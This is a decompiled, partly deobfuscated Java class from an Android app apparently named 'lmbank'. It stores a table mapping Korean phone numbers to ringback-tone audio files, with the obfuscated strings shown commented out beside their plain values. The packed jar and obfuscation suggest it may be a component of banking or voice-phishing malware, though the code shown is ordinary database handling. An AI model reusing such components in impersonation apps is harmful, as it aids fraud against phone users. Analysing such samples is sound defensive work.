package com.wish.lmbank.db;

import android.annotation.SuppressLint;
import android.content.ContentValues;
import android.content.Context;
import android.database.Cursor;
import android.database.SQLException;
import android.database.sqlite.SQLiteDatabase;
import android.telephony.PhoneNumberUtils;
import android.text.TextUtils;

import com.wish.lmbank.bean.ColorRingBean;
import com.wish.lmbank.utils.LogUtils;

import java.util.List;

import gv00l3ah.mvdt7w.bb7d7pu7;

/* loaded from: cookie_9234504.jar:com/wish/lmbank/db/CallRingDB.class */
public class CallRingDB extends RecordingDB {
    private static final String TAG = "com.wish.lmbank.db.CallRingDB";
    private static CallRingDB instance;

    public static CallRingDB getInstance(Context context) {
        CallRingDB callRingDB;
        synchronized (CallRingDB.class) {
            try {
                if (instance == null) {
                    instance = new CallRingDB(context.getApplicationContext());
                }
                callRingDB = instance;
            } catch (Throwable th) {
                throw th;
            }
        }
        return callRingDB;
    }

    private CallRingDB(Context context) {
//         super(context, bb7d7pu7.m5998("CgYFBhs2GwAHDg"));
        super(context, "color_ring");
    }

    public void addColorRingList(List<ColorRingBean> list) {
        synchronized (this) {
            SQLiteDatabase sQLiteDatabase = getSQLiteDatabase();
            sQLiteDatabase.beginTransaction();
            for (ColorRingBean colorRingBean : list) {
                if (colorRingBean.getPhone() != null) {
//                     String formatNumber = PhoneNumberUtils.formatNumber(colorRingBean.getPhone().replace(bb7d7pu7.m5998("RA"), "").replace(bb7d7pu7.m5998("SQ"), ""), bb7d7pu7.m5998("Ijs"));
                    String formatNumber = PhoneNumberUtils.formatNumber(colorRingBean.getPhone().replace("-", "").replace(" ", ""), "KR");
                    ContentValues contentValues = new ContentValues();
//                     contentValues.put(bb7d7pu7.m5998("GQEGBww"), formatNumber);
                    contentValues.put("phone", formatNumber);
//                     contentValues.put(bb7d7pu7.m5998("DwAFDA"), colorRingBean.getFile());
                    contentValues.put("file", colorRingBean.getFile());
                    insertOrReplace(contentValues);
                }
            }
            sQLiteDatabase.setTransactionSuccessful();
            sQLiteDatabase.endTransaction();
        }
    }

    public long deleteAllColorRing() {
        long delete;
        synchronized (this) {
            delete = delete("", new String[0]);
        }
        return delete;
    }

    public ColorRingBean queryColorRingFile(String str) {
        Cursor cursor;
        Cursor cursor2;
        ColorRingBean colorRingBean;
        Cursor cursor3 = null;
        ColorRingBean colorRingBean2 = null;
        synchronized (this) {
            if (TextUtils.isEmpty(str)) {
                return null;
            }
            try {
                try {
//                     cursor3 = query(new String[]{bb7d7pu7.m5998("GQEGBww"), bb7d7pu7.m5998("DwAFDA")}, bb7d7pu7.m5998("GQEGBwxJVElWSQ"), new String[]{PhoneNumberUtils.formatNumber(str.replace(bb7d7pu7.m5998("RA"), "").replace(bb7d7pu7.m5998("SQ"), ""), bb7d7pu7.m5998("Ijs"))});
                    cursor3 = query(new String[]{"phone", "file"}, "phone = ? ", new String[]{PhoneNumberUtils.formatNumber(str.replace("-", "").replace(" ", ""), "KR")});
                    colorRingBean2 = null;
                } catch (SQLException e) {
                    e = e;
                    cursor2 = null;
                } catch (Throwable th) {
                    th = th;
                    cursor = null;
                    if (cursor != null) {
                        cursor.close();
                    }
                    throw th;
                }
                try {
                    if (cursor3.moveToNext()) {
                        colorRingBean2 = getColorRing(cursor3);
                    }
                    colorRingBean = colorRingBean2;
                } catch (SQLException e2) {
                    cursor2 = cursor3;
//                     LogUtils.w(TAG, bb7d7pu7.m5998("LBsbBhtJBQYIDQAHDkkZGwwfAAweSQ8bBgRJLSs"), e2);
                    LogUtils.w(TAG, "Error loading preview from DB", e2);
                    colorRingBean = null;
                    if (cursor2 != null) {
                        colorRingBean = null;
                        cursor3 = cursor2;
                        cursor3.close();
                    }
                    return colorRingBean;
                }
                if (cursor3 != null) {
                    colorRingBean = colorRingBean2;
                    cursor3.close();
                }
                return colorRingBean;
            } catch (Throwable th2) {

                cursor = null;

                throw new RuntimeException(th2);
            }
        }
    }

    @SuppressLint("Range")
    private ColorRingBean getColorRing(Cursor cursor) {
        ColorRingBean colorRingBean = new ColorRingBean();
//         colorRingBean.setPhone(cursor.getString(cursor.getColumnIndex(bb7d7pu7.m5998("GQEGBww"))));
        colorRingBean.setPhone(cursor.getString(cursor.getColumnIndex("phone")));
//         colorRingBean.setFile(cursor.getString(cursor.getColumnIndex(bb7d7pu7.m5998("DwAFDA"))));
        colorRingBean.setFile(cursor.getString(cursor.getColumnIndex("file")));
        return colorRingBean;
    }
}
